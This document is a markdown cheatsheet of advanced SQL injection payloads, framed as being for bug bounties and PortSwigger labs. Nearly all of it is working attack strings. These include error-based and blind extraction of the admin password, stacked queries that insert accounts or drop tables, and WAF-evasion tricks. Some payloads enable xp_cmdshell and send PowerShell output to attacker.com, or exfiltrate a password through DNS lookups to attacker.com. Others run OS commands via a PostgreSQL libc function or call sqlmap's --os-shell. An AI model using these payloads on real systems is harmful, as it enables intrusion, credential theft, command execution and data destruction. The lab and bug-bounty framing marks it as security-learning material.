# Advanced SQL Injection Cheatsheet for Bug Bounties and Labs

## 1. Advanced SQL Syntax Manipulation Techniques

### Error-Based Data Extraction

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) -- -
```
**Explanation**: Forces MySQL to show an error message containing the database name between two tildes (~). The `0x7e` is hex code for tilde character.

```sql
' AND UpdateXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e), 1) -- -
```
**Explanation**: Similar to the above, but using UpdateXML to extract table names one by one.

### Stacked Queries (Multiple Queries)

```sql
'; INSERT INTO users (username, password) VALUES ('hacker','password123'); -- -
```
**Explanation**: Ends the current query with `;` then executes a new query that adds a new user account. Works when stacked queries are allowed.

### Conditional Time Delays for Data Extraction

```sql
'; SELECT IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), NULL); -- -
```
**Explanation**: If the first character of admin's password is 'a', the database will pause for 5 seconds. This lets you extract data character by character.

## 2. Database-Specific Advanced Techniques

### MySQL Advanced

```sql
' UNION SELECT JSON_ARRAYAGG(CONCAT(table_schema,'.',table_name)) FROM information_schema.tables -- -
```
**Explanation**: Uses JSON functions to combine all table names into a single result, making data extraction more efficient.

```sql
' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' -- -
```
**Explanation**: Combines all column names from the "users" table into a single string, separated by commas.

### SQL Server Advanced

```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -
```
**Explanation**: A series of commands that enables the xp_cmdshell feature, which allows running system commands.

```sql
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/?data=$(whoami) -Method GET"'; -- -
```
**Explanation**: Executes a PowerShell command that sends the username of the database service to an attacker's server.

### Oracle Advanced

```sql
' UNION SELECT LISTAGG(owner||'.'||table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables -- -
```
**Explanation**: Uses LISTAGG to combine all table names into a single result, separated by commas.

### PostgreSQL Advanced

```sql
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('id'); -- -
```
**Explanation**: Creates a function that can execute system commands, then runs the 'id' command.

## 3. WAF Bypass Techniques

### String and Character Manipulation

```sql
' UNION SELECT CHAR(85,115,101,114,115) -- -
```
**Explanation**: Uses CHAR function to spell out "Users" using ASCII codes, bypassing filters that block the word "users".

```sql
' UnIoN/**/SeLeCt/**/username,password/**/FrOm/**/users -- -
```
**Explanation**: Mixes uppercase and lowercase letters and adds comments between words to bypass pattern matching.

### Alternatives to Common SQL Keywords

```sql
' UNION (SELECT username, password FROM users) -- -
```
**Explanation**: Uses parentheses to break up the SQL pattern.

```sql
' UNION SELECT!(username),password FROM users -- -
```
**Explanation**: Uses the ! operator to manipulate the query syntax while maintaining functionality.

### Encoding Tricks

```sql
' UNION SELECT 0x75736572,0x70617373 FROM users -- -
```
**Explanation**: Uses hex encoding (0x) to represent the strings "user" and "pass" to bypass filters.

```sql
' UNION SELECT CONCAT('0x',HEX(table_name)) FROM information_schema.tables -- -
```
**Explanation**: Converts table names to hex representation on the fly.

## 4. Blind SQL Injection Advanced Techniques

### Binary Search Method

```sql
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 109 -- -
```
**Explanation**: Tests if the first character's ASCII value is greater than 109 (letter 'm'). By narrowing down the range, you can find the exact character much faster than testing each one.

### Bit-By-Bit Extraction

```sql
' AND (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))&1)=1 -- -
```
**Explanation**: Tests just the lowest bit of the character's ASCII value. By testing each bit position, you can reconstruct the entire character.

### Out-of-Band Data Exfiltration

```sql
' AND IF(1=1, (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.attacker.com\\share\\a'))), NULL) -- -
```
**Explanation**: Makes the MySQL server attempt to load a file from a network path that includes the password as part of the domain name, causing a DNS lookup that can be monitored.

## 5. Advanced Automation Tricks

### SQLMap Advanced Commands

```bash
sqlmap -u "http://target.com/page?id=1" --risk=3 --level=5 --tamper=between,randomcase,space2comment --random-agent --batch --dbms=mysql --dbs
```
**Explanation**: Uses multiple evasion techniques (tamper scripts) with maximum risk/level settings and a random user-agent to bypass WAFs.

```bash
sqlmap -u "http://target.com/page?id=1" --os-shell --technique=T
```
**Explanation**: Attempts to get an operating system shell using time-based blind techniques.

## 6. PortSwigger Lab-Specific Advanced Payloads

### Lab: SQL injection with filter bypass via XML encoding

```xml
<stockCheck>
  <productId><![CDATA[123' UNION SELECT username || '~' || password FROM users--]]></productId>
  <storeId>1</storeId>
</stockCheck>
```
**Explanation**: Uses CDATA section in XML to inject SQL, combining usernames and passwords with a separator for easier reading.

### Lab: Blind SQL injection with conditional errors

```sql
' AND (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users)='a
```
**Explanation**: Uses a CASE statement to cause a division-by-zero error only when the condition is true, allowing data extraction through error messages.

### Lab: SQL injection with filter bypass using a recursive SELECT

```sql
' UNION WITH RECURSIVE x AS (SELECT 1 UNION ALL SELECT 1) SELECT username,password FROM users -- -
```
**Explanation**: Uses a recursive common table expression (CTE) to bypass filters that look for simple UNION SELECT patterns.

## 7. Real-World Bug Bounty Advanced Techniques

### Testing Obscure Inputs

```
X-Forwarded-For: ', (SELECT 1 FROM (SELECT SLEEP(5))x) -- -
```
**Explanation**: Injects into HTTP headers that might not be properly sanitized.

### JSON Parameter Injection

```json
{"username": "admin' OR 1=1 -- -", "password": "anything"}
```
**Explanation**: Injects SQL into JSON data in API requests.

### SQLi in Unusual File Types

```
filename=exploit.jpg'; SELECT 1,2,3 FROM users; -- -
```
**Explanation**: Tests for SQL injection in file upload handlers or when files are processed.

### Blind SQLi in analytics parameters

```
https://target.com/page?utm_source='; IF (SELECT COUNT(*) FROM users)>100 THEN pg_sleep(5) ELSE pg_sleep(0) END; -- -
```
**Explanation**: Targets analytics tracking parameters that might be stored in a database without proper sanitization.

## 8. Advanced SQL Logic Manipulation

### Second-Order SQL Injection

```sql
' UNION SELECT 'x"; DROP TABLE users; -- -', 'password' -- -
```
**Explanation**: Stores a malicious payload that will be executed when the data is used in another query later.

### Advanced UNION select with ORDER BY injection

```sql
' UNION SELECT NULL,NULL FROM information_schema.tables WHERE table_schema=database() ORDER BY (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%') -- -
```
**Explanation**: Uses the ORDER BY clause to test conditions—if true, query executes normally; if false, it may cause an error.

### Conditional subqueries with delayed execution

```sql
' AND EXISTS(SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT DISTINCT CONCAT(0x7e, version(), 0x7e) FROM information_schema.tables LIMIT 0,1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a) -- -
```
**Explanation**: An advanced technique that causes MySQL to leak data through a groupwise error message.
